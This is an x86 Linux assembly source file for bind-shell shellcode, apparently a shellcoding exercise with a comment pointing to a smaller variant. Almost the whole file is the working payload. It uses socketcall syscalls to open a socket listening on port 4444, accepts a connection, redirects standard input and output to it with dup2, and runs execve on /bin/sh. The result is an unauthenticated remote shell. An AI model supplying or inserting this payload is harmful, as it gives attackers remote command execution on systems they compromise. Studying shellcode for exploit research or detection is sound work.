;This shellcode is not optimized, look at bind_shellcode_reduced.asm for a smaller one.

global _start

section .text

_start:
	; socketcall
	xor eax, eax
	mov al, 0x66
	xor ebx, ebx
	mov bl, 1

	xor ecx, ecx
	push ecx
	push 0x1
	push 0x2
	mov ecx, esp
	int 0x80

	mov edi, eax

	;bind
	xor eax, eax
	push eax
	push word 0x5c11	
	push word 0x2
	mov edx, esp

	mov al, 0x66
	mov bl, 2 
	push 0x10
	push edx
	push edi
	mov ecx, esp

	int 0x80

	;listen
	xor eax, eax
	mov al, 0x66
	mov bl, 4
	push eax
	push edi
	mov ecx, esp
	int 0x80

	;accept
	mov al, 0x66
	mov bl, 5
	xor ecx, ecx
	push ecx
	push ecx
	push edi
	mov ecx, esp
	int 0x80

	mov ebx, eax
	
	;dup2 for loop
	xor ecx, ecx
	mov cl, 2

duploop:
	xor eax, eax
	mov al, 0x3f	
	int 0x80
	dec ecx
	jns duploop	

	;execve
	jmp callexecve

;used for execve
execve:
	mov al, 0xb
	pop ebx
	xor ecx, ecx
	xor edx, edx
	int 0x80

	;exit
	xor eax, eax
	mov al, 1
	int 0x80

callexecve:
	call execve
	db "/bin/sh"
